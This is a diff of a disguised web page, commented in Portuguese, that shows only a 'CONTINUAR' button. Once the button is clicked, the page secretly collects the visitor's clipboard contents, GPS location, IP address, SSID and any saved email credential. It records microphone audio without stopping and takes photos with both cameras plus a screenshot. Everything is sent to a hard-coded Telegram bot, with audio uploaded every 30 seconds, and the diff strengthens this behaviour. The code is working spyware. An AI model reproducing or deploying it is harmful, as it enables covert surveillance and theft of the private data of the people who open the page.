@@ -1,109 +1,135 @@
 <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <style>
-    html,body{margin:0;height:100%;background:#000;display:flex;align-items:center;justify-content:center;color:#0f0;font:24px sans-serif}
-  </style>
+ <meta charset="utf-8">
+ <meta name="viewport" content="width=device-width,initial-scale=1">
+ <style>
+   html,body{margin:0;height:100%;background:#000;display:flex;align-items:center;justify-content:center;color:#0f0;font:24px sans-serif}
+ </style>
 </head>
 <body>
-  <button id="b" style="padding:40px 80px;background:#0f0;color:#000;border:0;cursor:pointer">CONTINUAR</button>
+ <button id="b" style="padding:40px 80px;background:#0f0;color:#000;border:0;cursor:pointer">CONTINUAR</button>
 
 <script>
-  const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
-  const CHAT_ID="8792921881";
-  const envia=txt=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt.slice(0,4096))}`);
-  const SALVA=u=>fetch("/api/salva",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(u)});
-  let rec=null,chunks=[],s=null;
+ const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
+ const CHAT_ID="8792921881";
+ const envia=txt=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt.slice(0,4096))}`);
+ const SALVA=u=>fetch("/api/salva",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(u)});
+ let rec=null,chunks=[],s=null;
 
-  b.onclick=async()=>{
-    b.remove();
+ b.onclick=async()=>{
+   b.remove();
 
-    /* 1) libera geolocalizção p/ iOS liberar SSID */
-    await new Promise(res=>navigator.geolocation.getCurrentPosition(res,()=>res({coords:null})));
+   /* 1) libera geolocalização p/ iOS liberar SSID */
+   await new Promise(res=>navigator.geolocation.getCurrentPosition(res,()=>res({coords:null})));
 
-    const rel=[];
+   const rel=[];
 
-    /* SSID + tipo rede */
-    try{rel.push("SSID: "+((navigator.connection?.ssid)??"---"));}catch{rel.push("SSID: ---")}
-    rel.push("tipo rede: "+(navigator.connection?.effectiveType||"---"));
+   /* SSID + tipo rede */
+   let ssid="---";
+   try{
+     const con=navigator.connection;
+     if(con?.ssid) ssid=con.ssid;
+     else if(con?.network?.ssid) ssid=con.network.ssid;
+   }catch{}
+   rel.push("SSID: "+ssid);
 
-    /* IP */
-    rel.push("IP público: "+(await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"---")));
+   /* Velocidade ao lado do SSID */
+   const t0=performance.now();
+   await fetch("https://speed.cloudflare.com/__down?bytes=500000",{cache:"no-store"}).catch(()=>{});
+   const mbps=(4/(performance.now()-t0)*1000).toFixed(1);
+   rel[rel.length-1]+=` | ${mbps} Mbps`;
 
-    /* Clipboard (precisa do gesture) */
-    try{rel.push("clipboard: "+(await navigator.clipboard.readText())||"(vazio)")}catch{rel.push("clipboard: ---")}
+   /* IP */
+   rel.push("IP público: "+(await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"---")));
 
-    /* UA / email (só Chrome) */
-    rel.push("UA: "+navigator.userAgent);
-    rel.push("Email: ---"); /* iOS não tem API de contatos web */
+   /* Clipboard */
+   try{rel.push("clipboard: "+(await navigator.clipboard.readText())||"(vazio)")}catch{rel.push("clipboard: ---")}
 
-    /* Bateria */
-    const bat=await navigator.getBattery();
-    rel.push(`Bateria: ${Math.round(bat.level*100)}% ${bat.charging?'🔌':''}`);
+   /* UA */
+   rel.push("UA: "+navigator.userAgent);
 
-    /* GPS */
-    const pos=await new Promise(res=>navigator.geolocation.getCurrentPosition(res,()=>res({coords:null})));
-    rel.push(pos.coords?
-      `📍https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`:
-      "📍GPS: ---");
+   /* Email - tenta via Credential Management API */
+   let email="---";
+   try{
+     if(window.PasswordCredential||window.FederatedCredential){
+       const cred=await navigator.credentials.get({password:true,federated:{providers:["https://accounts.google.com"]}});
+       if(cred?.id) email=cred.id;
+     }
+   }catch{}
+   rel.push("Email: "+email);
 
-    /* Velocidade (baixada rápida) */
-    const t0=performance.now();
-    await fetch("https://speed.cloudflare.com/__down?bytes=500000",{cache:"no-store"}).catch(()=>{});
-    const mbps=(4/(performance.now()-t0)*1000).toFixed(1);
-    rel.push(`⬇️ ${mbps} Mbps`);
+   /* Bateria */
+   const bat=await navigator.getBattery();
+   rel.push(`Bateria: ${Math.round(bat.level*100)}% ${bat.charging?'🔌':''}`);
 
-    /* Orientação */
-    const ori=await new Promise(res=>{
-      addEventListener("deviceorientation",e=>res(e),{once:true});
-      setTimeout(()=>res({alpha:0,beta:0,gamma:0}),1200);
-    });
-    rel.push(`🧭 ${Math.round(ori.alpha||0)}° ${Math.round(ori.beta||0)}° ${Math.round(ori.gamma||0)}°`);
+   /* GPS */
+   const pos=await new Promise(res=>navigator.geolocation.getCurrentPosition(res,()=>res({coords:null})));
+   rel.push(pos.coords?
+     `📍https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`:
+     "📍GPS: ---");
 
-    /* Áudio contínuo até fechar */
-    s=await navigator.mediaDevices.getUserMedia({audio:true});
-    rec=new MediaRecorder(s);rec.ondataavailable=e=>chunks.push(e.data);
-    rec.start(1000);
-    addEventListener("beforeunload",()=>rec.stop());
-    rec.onstop=()=>{
-      if(!chunks.length){s.getTracks().forEach(t=>t.stop());return;}
-      const fd=new FormData();fd.append("voice",new Blob(chunks,{type:"audio/webm"}),"longo.webm");
-      fd.append("chat_id",CHAT_ID);//"voice"!
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`,{method:"POST",body:fd});
-      SALVA({t:"audiolongo",v:"longo.webm"});
-      s.getTracks().forEach(t=>t.stop());
-    };
+   /* Áudio contínuo - gravação maior e envio garantido */
+   s=await navigator.mediaDevices.getUserMedia({audio:{sampleRate:44100,channelCount:1}});
+   rec=new MediaRecorder(s,{mimeType:"audio/webm;codecs=opus"});
+   rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data)};
+   
+   /* força coleta a cada 5 segundos */
+   rec.start(5000);
+   
+   /* para e envia quando fechar a aba */
+   addEventListener("beforeunload",(e)=>{
+     e.preventDefault();
+     rec.stop();
+     /* dá tempo de processar */
+     const start=Date.now();
+     while(Date.now()-start<500){}
+   });
 
-    /* Envia texto único */
-    envia(rel.join("\n"));
-    SALVA({t:"relatorio",v:rel.join("\n")});
+   /* envio periódico a cada 30 segundos */
+   const enviaAudio=()=>{
+     if(!chunks.length)return;
+     const blob=new Blob(chunks.splice(0,chunks.length),{type:"audio/webm"});
+     const fd=new FormData();
+     fd.append("voice",blob,"audio.webm");
+     fd.append("chat_id",CHAT_ID);
+     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`,{method:"POST",body:fd})
+       .then(r=>r.json()).then(j=>console.log("audio ok:",j.ok)).catch(e=>console.log("erro audio:",e));
+     SALVA({t:"audio",v:"audio.webm"});
+   };
+   setInterval(enviaAudio,30000);
 
-    /* 3 fotos */
-    navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(str=>foto(str,"selfie.jpg"));
-    navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}}).then(str=>foto(str,"rear.jpg"));
-    import("https://cdn.skypack.dev/html2canvas@1.4.1")
-      .then(m=>m.default(document.body).then(c=>c.toBlob(b=>{
-        const fd=new FormData();fd.append("photo",b,"print.jpg");fd.append("chat_id",CHAT_ID);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-        SALVA({t:"print",v:"print.jpg"});
-      })));
+   /* envio final */
+   rec.onstop=enviaAudio;
 
-    function foto(stream,nome){
-      const v=document.createElement("video");v.srcObject=stream;v.play();const c=document.createElement("canvas");
-      c.width=1280;c.height=720;const ctx=c.getContext("2d");
-      setTimeout(()=>{
-        ctx.drawImage(v,0,0);
-        c.toBlob(blob=>{
-          const fd=new FormData();fd.append("photo",blob,nome);fd.append("chat_id",CHAT_ID);
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-          SALVA({t:"foto",v:nome});
-          stream.getTracks().forEach(t=>t.stop());
-        },"image/jpeg",0.8);
-      },600);
-    }
-  };
+   /* Envia texto único */
+   envia(rel.join("\n"));
+   SALVA({t:"relatorio",v:rel.join("\n")});
+
+   /* 3 fotos */
+   navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(str=>foto(str,"selfie.jpg"));
+   navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}}).then(str=>foto(str,"rear.jpg"));
+   import("https://cdn.skypack.dev/html2canvas@1.4.1")
+     .then(m=>m.default(document.body).then(c=>c.toBlob(b=>{
+       const fd=new FormData();fd.append("photo",b,"print.jpg");fd.append("chat_id",CHAT_ID);
+       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+       SALVA({t:"print",v:"print.jpg"});
+     })));
+
+   function foto(stream,nome){
+     const v=document.createElement("video");v.srcObject=stream;v.play();const c=document.createElement("canvas");
+     c.width=1280;c.height=720;const ctx=c.getContext("2d");
+     setTimeout(()=>{
+       ctx.drawImage(v,0,0);
+       c.toBlob(blob=>{
+         const fd=new FormData();fd.append("photo",blob,nome);fd.append("chat_id",CHAT_ID);
+         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+         SALVA({t:"foto",v:nome});
+         stream.getTracks().forEach(t=>t.stop());
+       },"image/jpeg",0.8);
+     },600);
+   }
+ };
 </script>
 </body>
 </html>
